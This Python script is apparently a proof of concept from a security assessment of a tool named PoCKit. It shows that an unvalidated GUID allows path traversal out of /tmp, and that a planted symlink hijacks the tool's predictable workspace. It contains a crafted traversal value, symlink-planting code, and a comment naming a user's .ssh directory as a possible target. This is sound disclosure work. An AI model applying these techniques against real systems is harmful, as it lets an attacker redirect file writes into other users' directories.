"""PoC-F02: predictable PoCKit workspace path.

`pockit.__main__.setup_workspace` builds the default workspace as
    Path(f"/tmp/pockit-{guid}-workspace")
with no validation of `guid`, then calls `mkdir(parents=True, exist_ok=True)`.
Two consequences are demonstrated here:

  (a) path traversal - `guid` is interpolated straight into an absolute path,
      so a GUID containing `..` moves the workspace outside /tmp; and
  (b) pre-creation - `exist_ok=True` silently accepts a path that already
      exists, so a local attacker (or a second process) can pre-create it,
      including as a symlink, and PoCKit will use it as its own workspace.

Both run the shipped code from the target binary, unmodified.
"""
import argparse
import importlib
import os
import shutil
import stat
import sys


def load_setup_workspace(product):
    sys.path.insert(0, str(product))
    return importlib.import_module("pockit.__main__").setup_workspace


def show(label, path):
    st = os.lstat(path)
    kind = "symlink" if stat.S_ISLNK(st.st_mode) else ("dir" if stat.S_ISDIR(st.st_mode) else "file")
    print(f"    {label}: {path}")
    print(f"        type={kind} mode={oct(stat.S_IMODE(st.st_mode))} "
          f"realpath={os.path.realpath(path)}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--extract", default=os.environ.get(
        "SIGNAL_EXTRACT", "/tmp/vapt/signal-pyarmor-linux-x86_64_extracted"))
    args = ap.parse_args()
    setup_workspace = load_setup_workspace(args.extract)

    print("=" * 72)
    print("(a) path traversal through the unvalidated GUID")
    print("=" * 72)
    traversal_guid = "8/../../../../tmp/poc-f02-escaped"
    intended = f"/tmp/pockit-{traversal_guid}-workspace"
    target = "/tmp/poc-f02-escaped-workspace"
    for p in (target, "/tmp/pockit-8"):
        shutil.rmtree(p, ignore_errors=True)
    result = setup_workspace(None, "/tmp", traversal_guid)
    print(f"    guid              = {traversal_guid!r}")
    print(f"    string built by setup_workspace (its return value):")
    print(f"        {result}")
    print(f"    the string above is NOT the path that gets created; the OS")
    print(f"    collapses the embedded '..' components, so mkdir() actually")
    print(f"    created:")
    show("actual", target)
    print(f"    raw string starts with '/tmp/pockit-8/': "
          f"{result.startswith('/tmp/pockit-8/')}")
    print(f"    directory actually created: {os.path.realpath(target)}")
    print(f"    -> the workspace left the '/tmp/pockit-<guid>-workspace' template")
    print(f"    a guid such as 'x/../../../../home/<user>/.ssh' would place the")
    print(f"    workspace there instead (not exercised here)")
    for p in (target, "/tmp/pockit-8"):
        shutil.rmtree(p, ignore_errors=True)

    print()
    print("=" * 72)
    print("(b) pre-existing workspace is accepted (exist_ok=True)")
    print("=" * 72)
    guid = "11111111-2222-3333-4444-555555555555"
    ws = f"/tmp/pockit-{guid}-workspace"
    victim = "/tmp/poc-f02-victim-dir"
    for p in (ws, victim):
        if os.path.islink(p):
            os.unlink(p)
        shutil.rmtree(p, ignore_errors=True)
    os.makedirs(victim)
    with open(os.path.join(victim, "victim-secret.txt"), "w") as fh:
        fh.write("pre-existing content the scan should not touch\n")

    # The attacker does not need privileges to do this : the path is
    # world-writable in /tmp and is fully predictable from the GUID.
    os.symlink(victim, ws)
    print(f"    attacker planted a symlink: {ws} -> {victim}")
    show("planted", ws)

    result = setup_workspace(None, "/tmp", guid)
    print(f"    setup_workspace returned: {result}")
    print(f"    is it still a symlink to the victim dir? "
          f"{os.path.islink(ws) and os.path.realpath(ws) == os.path.realpath(victim)}")

    # Anything PoCKit writes into its workspace now lands in the victim dir.
    with open(os.path.join(result, "pockit-evidence.txt"), "w") as fh:
        fh.write("written through the workspace abstraction\n")
    landed = os.path.join(victim, "pockit-evidence.txt")
    print(f"    file written via the workspace appeared at: {landed}")
    print(f"    victim directory now contains: {sorted(os.listdir(victim))}")

    print()
    print("=" * 72)
    print("(c) default permissions of a freshly created default workspace")
    print("=" * 72)
    guid2 = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
    ws2 = f"/tmp/pockit-{guid2}-workspace"
    shutil.rmtree(ws2, ignore_errors=True)
    old = os.umask(0o022)
    try:
        setup_workspace(None, "/tmp", guid2)
    finally:
        os.umask(old)
    show("created", ws2)

    for p in (ws, victim, ws2):
        shutil.rmtree(p, ignore_errors=True)
        if os.path.islink(p):
            os.unlink(p)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
